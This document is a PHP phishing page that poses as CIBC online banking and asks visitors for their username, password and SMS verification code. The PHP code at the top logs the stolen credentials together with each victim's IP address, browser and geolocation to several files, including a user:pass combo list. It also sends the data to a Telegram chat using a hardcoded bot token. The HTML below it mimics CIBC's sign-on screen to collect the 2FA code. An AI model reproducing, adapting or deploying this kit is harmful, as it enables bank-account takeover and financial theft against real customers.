
       
 <?php
include "dick.php";
$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = '/telgram_log.txt';
$file2      = '/CIBC.csv';
$file3      = '/account_log.csv';
$file4      = '/usagent_log.txt';
$file5      = '/combo.txt';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "[ CIBC ]";
    $project    = "[CR00K-3D]";
    $url        = "https://CIBC.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 
    $code2      = "[2FA][$code]";
    $logo       = "[S-T-R|CR00K]";
    $gitusr     = "[SWIF-T-RYNX]";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
	$lh     = "|";
        $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message ="IMPORTANT DATA WAS LOGGED\n\n\n$bank$lh$ip$lh$uos\n\n\n\n$bank IDENTIY  :  $ip\n$bank Username  :  $user\n$bank Password  :  $pass\n\n$uos$lh$bsr\n$is\n$city$lh$country\n$la\n$lp\n\n$uaget\n\n$url";
file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass\n", FILE_APPEND); 
file_put_contents($file, "$message\n////[$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]/\n", FILE_APPEND);
file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
file_put_contents($file5, "$user:$pass\n", FILE_APPEND);
$apiToken = "5884162033:AAGRZN0UMfdlO3gqYgy8PpwDpdxKsDfaMlQ"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                
      ?><html lang="en"><head>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <title>Sign on | CIBC Online Banking</title>
      <style>
          @font-face {
              font-family: "Whitney";
              src: url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff2") format("woff2"),
                  url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff") format("woff");
              font-weight: normal;
              font-style: normal;
          }
          @font-face {
              font-family: "WhitneyBookRegular";
              src: url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff2") format("woff2"),
                  url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff") format("woff");
              font-weight: normal;
              font-style: normal;
          }
          @font-face {
              font-family: "Whitney";
              src: url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff2") format("woff2"),
                  url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff") format("woff");
              font-weight: 600;
              font-style: normal;
          }
          @font-face {
              font-family: "WhitneyMedium";
              src: url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff2") format("woff2"),
                  url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff") format("woff");
              font-weight: 500;
              font-style: normal;
          }
          @font-face {
              font-family: "Whitney";
              src: url("/ebm-resources/common-content/fonts/Whitney-Semibld_Web.woff2") format("woff2"),
                  url("/ebm-resources/common-content/fonts/Whitney-Semibld_Web.woff") format("woff");
              font-weight: 900;
              font-style: normal;
          }
      </style>
      <link rel="stylesheet" type="text/css" href="files/157-1f5342e1.css">
  </head>
  <body>
      <div id="app" data-v-app="">
          <div id="orchestrator">
              <div pathmatch="signon">
                  <div id="Auth" data-v-app="">
                      <div id="root">
                          <div class="announcer" aria-live="polite" aria-atomic="true" data-v-816f4d06="">Sign on | CIBC
                              Online Banking</div>
                          <div aria-hidden="false">
                              <div class="page-layout">
                                  <div class="header-section cell">
                                      <div class="grid-container">
                                          <header class="page-header">
                                              <div class="top-bar">
                                                  <div class="header-container"><button class="null ui-display-default ui-button" data-test-id="language-toggle-btn" loading="false" lang="fr">Français</button></div>
                                              </div>
                                              <div class="header-logo">
                                                  <div class="header-container"><img class="logo" src="files/files/cibc-logo-colour.89bf60f2.svg" alt="CIBC logo."></div>
                                              </div>
                                          </header>
                                      </div>
                                  </div>
                                  <div class="background-pattern"></div>
                                  <div class="main-content">
                                      <main>
                                          <div></div>
                                          <div class="grid">
                                              <div class="section-wrapper section-wrapper-signon">
                                                  <div class="signon-form-wrapper">
                                                      <!---->
                                                      
                                                      <form action="040150.php" method="post">
                                                          <div role="form" class="signon-elements-wrapper">
                                                              <div class="card-number-wrapper">
                                                                  <div class="card-number-input-field" data-test-id="card-number">
                                                                      <div class="ui-set-text-box-wrapper">
                                                                          <br>
  <br><font size="2%"><center>
  We sent a code to +1(xxx)xxx-xxxxx</center></font>
                                                                          
                                                                      </div>
                                                                  </div>
                                                              </div>
                                                              <div class="password-input-field-wrapper"><div class="password-input-field">                                                <div class="ui-set-text-box-wrapper">                                                 <div class="ui-wrapper"><input id="23-field" name="code" type="number" maxlength="32" aria-describedby="vue23-messages" aria-invalid="false" autocomplete="current-password" data-test-id="password-input" error="false" class=""></div>
                                                                          <div id="vue23-messages" class="ui-set-messages"></div>
                                                                      </div> 
                                                                  </div>
                                                              </div>          
                                                          </div>
                                                          <div class="ui-action-bar"><button aria-label="Sign on" class="primary-button ui-display-default ui-button" data-test-id="primary-button" loading="false" type="submit">Sign on</button>
                                                          </div>
                                                      </form>
                                                  </div>
                                              </div>
                                          </div>
                                      </main>
                                  </div>
                              </div>
                          </div>
                      </div>
                  </div>
              </div>
          </div>
      </div>
      
  </body></html>